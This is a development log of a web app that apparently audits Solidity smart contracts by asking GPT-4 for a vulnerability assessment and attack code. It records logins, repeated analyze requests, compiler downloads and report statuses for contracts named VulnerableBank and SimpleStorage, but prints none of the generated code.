2025-06-19 12:23:30,108 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 12:23:30,119 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-19_12-23, status: ERROR
2025-06-19 12:23:30,120 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 12:23:30,122 - werkzeug - INFO - 172.20.0.1 - - [19/Jun/2025 12:23:30] "POST /analyze HTTP/1.1" 200 -
2025-06-19 12:33:31,718 - app.app - INFO - Application started
2025-06-19 12:33:31,721 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.22.0.5:8000
2025-06-19 12:33:31,722 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 12:36:54,348 - app.app - INFO - Application started
2025-06-19 12:36:54,350 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.24.0.5:8000
2025-06-19 12:36:54,351 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 12:37:08,991 - werkzeug - INFO - 172.24.0.1 - - [19/Jun/2025 12:37:08] "OPTIONS /login HTTP/1.1" 200 -
2025-06-19 12:37:09,111 - werkzeug - INFO - 172.24.0.1 - - [19/Jun/2025 12:37:09] "POST /login HTTP/1.1" 200 -
2025-06-19 12:37:58,374 - werkzeug - INFO - 172.24.0.1 - - [19/Jun/2025 12:37:58] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 12:37:58,398 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 12:37:58,405 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 12:37:58,426 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 12:37:58,542 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-19 12:37:59,385 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-19_12-37, status: ERROR
2025-06-19 12:37:59,386 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 12:37:59,388 - werkzeug - INFO - 172.24.0.1 - - [19/Jun/2025 12:37:59] "POST /analyze HTTP/1.1" 200 -
2025-06-19 12:41:35,529 - app.app - INFO - Application started
2025-06-19 12:41:35,531 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.26.0.5:8000
2025-06-19 12:41:35,532 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 12:41:52,362 - werkzeug - INFO - 172.26.0.1 - - [19/Jun/2025 12:41:52] "OPTIONS /login HTTP/1.1" 200 -
2025-06-19 12:41:52,472 - werkzeug - INFO - 172.26.0.1 - - [19/Jun/2025 12:41:52] "POST /login HTTP/1.1" 200 -
2025-06-19 12:42:00,877 - werkzeug - INFO - 172.26.0.1 - - [19/Jun/2025 12:42:00] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 12:42:00,899 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 12:42:00,905 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 12:42:00,914 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 12:42:00,926 - solcx - INFO - Using solc version 0.4.26
2025-06-19 12:42:01,055 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-19_12-42, status: ERROR
2025-06-19 12:42:01,057 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 12:42:01,058 - werkzeug - INFO - 172.26.0.1 - - [19/Jun/2025 12:42:01] "POST /analyze HTTP/1.1" 200 -
2025-06-19 12:48:19,430 - app.app - INFO - Application started
2025-06-19 12:48:19,432 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.29.0.5:8000
2025-06-19 12:48:19,433 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 12:48:42,152 - werkzeug - INFO - 172.29.0.1 - - [19/Jun/2025 12:48:42] "OPTIONS /login HTTP/1.1" 200 -
2025-06-19 12:48:42,312 - werkzeug - INFO - 172.29.0.1 - - [19/Jun/2025 12:48:42] "POST /login HTTP/1.1" 200 -
2025-06-19 12:48:49,603 - werkzeug - INFO - 172.29.0.1 - - [19/Jun/2025 12:48:49] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 12:48:49,624 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 12:48:49,630 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 12:48:49,641 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 12:48:49,689 - solcx - INFO - Using solc version 0.4.26
2025-06-19 12:48:49,808 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-19_12-48, status: ERROR
2025-06-19 12:48:49,809 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 12:48:49,810 - werkzeug - INFO - 172.29.0.1 - - [19/Jun/2025 12:48:49] "POST /analyze HTTP/1.1" 200 -
2025-06-19 12:49:08,816 - werkzeug - INFO - 172.29.0.1 - - [19/Jun/2025 12:49:08] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 12:49:08,837 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 12:49:08,841 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 12:49:08,850 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 12:49:08,854 - solcx - INFO - Using solc version 0.4.26
2025-06-19 12:49:08,974 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-19_12-49, status: ERROR
2025-06-19 12:49:08,975 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 12:49:08,976 - werkzeug - INFO - 172.29.0.1 - - [19/Jun/2025 12:49:08] "POST /analyze HTTP/1.1" 200 -
2025-06-19 12:49:16,396 - werkzeug - INFO - 172.29.0.1 - - [19/Jun/2025 12:49:16] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 12:49:16,417 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 12:49:16,420 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 12:49:16,425 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 12:49:16,428 - solcx - INFO - Using solc version 0.4.26
2025-06-19 12:49:16,550 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-19_12-49, status: ERROR
2025-06-19 12:49:16,551 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 12:49:16,553 - werkzeug - INFO - 172.29.0.1 - - [19/Jun/2025 12:49:16] "POST /analyze HTTP/1.1" 200 -
2025-06-19 12:49:16,951 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 12:49:16,954 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 12:49:16,958 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 12:49:16,965 - solcx - INFO - Using solc version 0.4.26
2025-06-19 12:49:17,086 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-19_12-49, status: ERROR
2025-06-19 12:49:17,087 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 12:49:17,089 - werkzeug - INFO - 172.29.0.1 - - [19/Jun/2025 12:49:17] "POST /analyze HTTP/1.1" 200 -
2025-06-19 12:49:17,500 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 12:49:17,505 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 12:49:17,514 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 12:49:17,522 - solcx - INFO - Using solc version 0.4.26
2025-06-19 12:49:17,650 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-19_12-49, status: ERROR
2025-06-19 12:49:17,652 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 12:49:17,654 - werkzeug - INFO - 172.29.0.1 - - [19/Jun/2025 12:49:17] "POST /analyze HTTP/1.1" 200 -
2025-06-19 12:53:43,385 - app.app - INFO - Application started
2025-06-19 12:53:43,387 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.30.0.5:8000
2025-06-19 12:53:43,387 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 12:54:09,820 - werkzeug - INFO - 172.30.0.1 - - [19/Jun/2025 12:54:09] "OPTIONS /login HTTP/1.1" 200 -
2025-06-19 12:54:09,940 - werkzeug - INFO - 172.30.0.1 - - [19/Jun/2025 12:54:09] "POST /login HTTP/1.1" 200 -
2025-06-19 12:54:17,355 - werkzeug - INFO - 172.30.0.1 - - [19/Jun/2025 12:54:17] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 12:54:17,379 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 12:54:17,383 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 12:54:17,389 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 12:54:17,401 - solcx - INFO - Using solc version 0.4.26
2025-06-19 12:54:17,528 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-19_12-54, status: ERROR
2025-06-19 12:54:17,530 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 12:54:17,531 - werkzeug - INFO - 172.30.0.1 - - [19/Jun/2025 12:54:17] "POST /analyze HTTP/1.1" 200 -
2025-06-19 12:57:01,124 - app.app - INFO - Application started
2025-06-19 12:57:01,127 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.32.5:8000
2025-06-19 12:57:01,127 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 12:59:59,729 - werkzeug - INFO - 192.168.32.1 - - [19/Jun/2025 12:59:59] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 12:59:59,741 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 12:59:59,745 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 12:59:59,760 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 12:59:59,855 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-19 13:00:00,693 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-19_13-00, status: ERROR
2025-06-19 13:00:00,694 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 13:00:00,696 - werkzeug - INFO - 192.168.32.1 - - [19/Jun/2025 13:00:00] "POST /analyze HTTP/1.1" 200 -
2025-06-19 13:00:21,827 - app.app - INFO - Application started
2025-06-19 13:00:21,829 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.112.5:8000
2025-06-19 13:00:21,830 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 13:01:23,046 - werkzeug - INFO - 192.168.112.1 - - [19/Jun/2025 13:01:23] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 13:01:23,065 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 13:01:23,069 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 13:01:23,090 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 13:01:23,103 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-19_13-01, status: ERROR
2025-06-19 13:01:23,104 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 13:01:23,106 - werkzeug - INFO - 192.168.112.1 - - [19/Jun/2025 13:01:23] "POST /analyze HTTP/1.1" 200 -
2025-06-19 13:01:33,871 - werkzeug - INFO - 192.168.112.1 - - [19/Jun/2025 13:01:33] "OPTIONS /login HTTP/1.1" 200 -
2025-06-19 13:01:33,997 - werkzeug - INFO - 192.168.112.1 - - [19/Jun/2025 13:01:33] "POST /login HTTP/1.1" 200 -
2025-06-19 13:01:36,229 - werkzeug - INFO - 192.168.112.1 - - [19/Jun/2025 13:01:36] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 13:01:36,247 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 13:01:36,250 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 13:01:36,254 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 13:01:36,561 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-19 13:01:38,180 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-19_13-01, status: ERROR
2025-06-19 13:01:38,182 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 13:01:38,185 - werkzeug - INFO - 192.168.112.1 - - [19/Jun/2025 13:01:38] "POST /analyze HTTP/1.1" 200 -
2025-06-19 13:02:37,943 - werkzeug - INFO - 192.168.112.1 - - [19/Jun/2025 13:02:37] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 13:02:37,963 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 13:02:37,969 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 13:02:37,985 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 13:02:38,123 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-19 13:02:39,101 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-19_13-02, status: ERROR
2025-06-19 13:02:39,103 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 13:02:39,105 - werkzeug - INFO - 192.168.112.1 - - [19/Jun/2025 13:02:39] "POST /analyze HTTP/1.1" 200 -
2025-06-19 13:26:19,344 - app.app - INFO - Application started
2025-06-19 13:26:19,347 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.128.5:8000
2025-06-19 13:26:19,347 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 13:53:10,169 - app.app - INFO - Application started
2025-06-19 13:53:10,171 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.160.5:8000
2025-06-19 13:53:10,172 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 13:53:57,958 - werkzeug - INFO - 192.168.160.1 - - [19/Jun/2025 13:53:57] "[31m[1mPOST /login HTTP/1.1[0m" 401 -
2025-06-19 13:55:23,252 - werkzeug - INFO - 192.168.160.1 - - [19/Jun/2025 13:55:23] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-19 13:55:26,216 - werkzeug - INFO - 192.168.160.1 - - [19/Jun/2025 13:55:26] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-19 13:55:31,239 - werkzeug - INFO - 192.168.160.1 - - [19/Jun/2025 13:55:31] "[31m[1mPOST /login HTTP/1.1[0m" 401 -
2025-06-19 13:56:00,985 - werkzeug - INFO - 192.168.160.1 - - [19/Jun/2025 13:56:00] "OPTIONS /login HTTP/1.1" 200 -
2025-06-19 13:56:01,124 - werkzeug - INFO - 192.168.160.1 - - [19/Jun/2025 13:56:01] "POST /login HTTP/1.1" 200 -
2025-06-19 13:56:25,128 - werkzeug - INFO - 192.168.160.1 - - [19/Jun/2025 13:56:25] "POST /login HTTP/1.1" 200 -
2025-06-19 13:56:25,157 - werkzeug - INFO - 192.168.160.1 - - [19/Jun/2025 13:56:25] "[31m[1mPOST /analyze HTTP/1.1[0m" 401 -
2025-06-19 14:25:14,522 - app.app - INFO - Application started
2025-06-19 14:25:14,524 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.18.0.5:8000
2025-06-19 14:25:14,526 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 14:25:43,751 - werkzeug - INFO - 172.18.0.1 - - [19/Jun/2025 14:25:43] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 14:25:43,790 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 14:25:43,801 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 14:25:43,816 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 14:25:43,908 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-19 14:25:44,799 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-19_14-25, status: ERROR
2025-06-19 14:25:44,801 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 14:25:44,803 - werkzeug - INFO - 172.18.0.1 - - [19/Jun/2025 14:25:44] "POST /analyze HTTP/1.1" 200 -
2025-06-19 14:33:40,063 - app.app - INFO - Application started
2025-06-19 14:33:40,075 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.20.0.5:8000
2025-06-19 14:33:40,077 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 14:35:46,618 - werkzeug - INFO - 172.20.0.1 - - [19/Jun/2025 14:35:46] "OPTIONS /login HTTP/1.1" 200 -
2025-06-19 14:35:47,110 - werkzeug - INFO - 172.20.0.1 - - [19/Jun/2025 14:35:47] "POST /login HTTP/1.1" 200 -
2025-06-19 14:36:05,076 - werkzeug - INFO - 172.20.0.1 - - [19/Jun/2025 14:36:05] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 14:36:05,110 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 14:36:05,124 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 14:36:05,137 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 14:36:05,324 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-19 14:36:06,210 - solcx - INFO - Using solc version 0.8.0
2025-06-19 14:36:06,212 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-19 14:36:06,217 - solcx - INFO - Using solc version 0.8.0
2025-06-19 14:36:08,738 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-19 14:36:08,740 - app.modules.attack_generator - INFO - Contract name: VulnerableBank
2025-06-19 14:36:08,742 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-19 14:36:08,743 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-19 14:36:08,746 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 14:36:08,748 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 14:36:08,749 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 14:36:22,851 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 14:36:22,895 - app.modules.attack_generator - INFO - Received response from OpenAI API in 14.15 seconds
2025-06-19 14:36:22,901 - app.modules.attack_generator - INFO - Contract analysis completed in 14.15 seconds
2025-06-19 14:36:22,903 - app.modules.attack_generator - INFO - Vulnerability assessment: The contract has a reentrancy vulnerability in the withdraw function. The contract sends Ether to th...
2025-06-19 14:36:22,904 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-19 14:36:22,906 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 14:36:22,907 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 14:36:22,909 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 14:36:32,847 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 14:36:32,871 - app.modules.attack_generator - INFO - Received response from OpenAI API in 9.96 seconds
2025-06-19 14:36:32,876 - app.modules.attack_generator - INFO - Attack code generation completed in 9.96 seconds
2025-06-19 14:36:32,880 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 982
2025-06-19 14:36:32,882 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 24.11 seconds
2025-06-19 14:36:32,885 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-19 14:36:32,932 - app.api.contract - INFO - Report saved with filename: VulnerableBank_2025-06-19_14-36, status: KO
2025-06-19 14:36:32,933 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 14:36:32,936 - werkzeug - INFO - 172.20.0.1 - - [19/Jun/2025 14:36:32] "POST /analyze HTTP/1.1" 200 -
2025-06-19 15:26:08,691 - app.app - INFO - Application started
2025-06-19 15:26:08,705 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.22.0.5:8000
2025-06-19 15:26:08,706 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 15:26:10,379 - werkzeug - INFO - 172.22.0.1 - - [19/Jun/2025 15:26:10] "OPTIONS /login HTTP/1.1" 200 -
2025-06-19 15:26:10,473 - werkzeug - INFO - 172.22.0.1 - - [19/Jun/2025 15:26:10] "[35m[1mPOST /login HTTP/1.1[0m" 500 -
2025-06-19 15:27:14,077 - app.app - INFO - Application started
2025-06-19 15:27:14,094 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.25.0.5:8000
2025-06-19 15:27:14,098 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-19 15:28:22,822 - werkzeug - INFO - 172.25.0.1 - - [19/Jun/2025 15:28:22] "OPTIONS /register HTTP/1.1" 200 -
2025-06-19 15:28:23,297 - werkzeug - INFO - 172.25.0.1 - - [19/Jun/2025 15:28:23] "POST /register HTTP/1.1" 200 -
2025-06-19 15:28:31,648 - werkzeug - INFO - 172.25.0.1 - - [19/Jun/2025 15:28:31] "OPTIONS /login HTTP/1.1" 200 -
2025-06-19 15:28:32,075 - werkzeug - INFO - 172.25.0.1 - - [19/Jun/2025 15:28:32] "POST /login HTTP/1.1" 200 -
2025-06-19 15:29:19,958 - werkzeug - INFO - 172.25.0.1 - - [19/Jun/2025 15:29:19] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 15:29:19,990 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 15:29:20,003 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 15:29:20,009 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 15:29:20,196 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-19 15:29:21,280 - solcx - INFO - Using solc version 0.8.0
2025-06-19 15:29:21,282 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-19 15:29:21,286 - solcx - INFO - Using solc version 0.8.0
2025-06-19 15:29:25,227 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 15:29:26,091 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-19 15:29:26,093 - app.modules.attack_generator - INFO - Contract name: SimpleStorage
2025-06-19 15:29:26,094 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-19 15:29:26,095 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-19 15:29:26,099 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 15:29:26,100 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 15:29:26,101 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 15:29:37,250 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 15:29:37,259 - app.modules.attack_generator - INFO - Received response from OpenAI API in 11.16 seconds
2025-06-19 15:29:37,268 - app.modules.attack_generator - INFO - Contract analysis completed in 11.16 seconds
2025-06-19 15:29:37,270 - app.modules.attack_generator - INFO - Vulnerability assessment: The contract does not have any apparent security vulnerabilities such as reentrancy, logic bugs, per...
2025-06-19 15:29:37,273 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-06-19 15:29:37,275 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-06-19 15:29:37,278 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-06-19 15:29:37,280 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-06-19 15:29:42,159 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 15:29:42,180 - app.modules.attack_generator - INFO - Received response from OpenAI API in 4.90 seconds
2025-06-19 15:29:42,186 - app.modules.attack_generator - INFO - Attack code generation completed in 4.90 seconds
2025-06-19 15:29:42,188 - app.modules.attack_generator - INFO - No attack code was generated
2025-06-19 15:29:42,191 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 16.06 seconds
2025-06-19 15:29:42,193 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-06-19 15:29:42,231 - app.api.contract - INFO - Report saved with filename: SimpleStorage_2025-06-19_15-29, status: OK
2025-06-19 15:29:42,233 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-19 15:29:42,235 - werkzeug - INFO - 172.25.0.1 - - [19/Jun/2025 15:29:42] "POST /analyze HTTP/1.1" 200 -
2025-06-19 15:29:49,821 - werkzeug - INFO - 172.25.0.1 - - [19/Jun/2025 15:29:49] "OPTIONS /history HTTP/1.1" 200 -
2025-06-19 15:29:49,865 - werkzeug - INFO - 172.25.0.1 - - [19/Jun/2025 15:29:49] "GET /history HTTP/1.1" 200 -
2025-06-19 15:39:12,098 - werkzeug - INFO - 172.25.0.1 - - [19/Jun/2025 15:39:12] "OPTIONS /register HTTP/1.1" 200 -
2025-06-19 15:39:12,583 - werkzeug - INFO - 172.25.0.1 - - [19/Jun/2025 15:39:12] "POST /register HTTP/1.1" 200 -
2025-06-19 15:41:47,228 - werkzeug - INFO - 172.25.0.1 - - [19/Jun/2025 15:41:47] "OPTIONS /login HTTP/1.1" 200 -
2025-06-19 15:41:47,682 - werkzeug - INFO - 172.25.0.1 - - [19/Jun/2025 15:41:47] "POST /login HTTP/1.1" 200 -
2025-06-19 15:41:55,049 - werkzeug - INFO - 172.25.0.1 - - [19/Jun/2025 15:41:55] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-19 15:41:55,082 - app.api.contract - INFO - Received analyze request from wallet: 0x742d35Cc6634C0532925a3b844Bc454e4438f44R
2025-06-19 15:41:55,094 - app.api.contract - INFO - Analyzing code snippet
2025-06-19 15:41:55,105 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-19 15:41:55,123 - solcx - INFO - Using solc version 0.8.0
2025-06-19 15:41:56,885 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-19 15:41:57,706 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-06-19 15:41:57,708 - app.modules.attack_generator - INFO - Contract name: SimpleStorage
2025-06-19 15:41:57,709 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-06-19 15:41:57,710 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-06-19 15:41:57,712 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
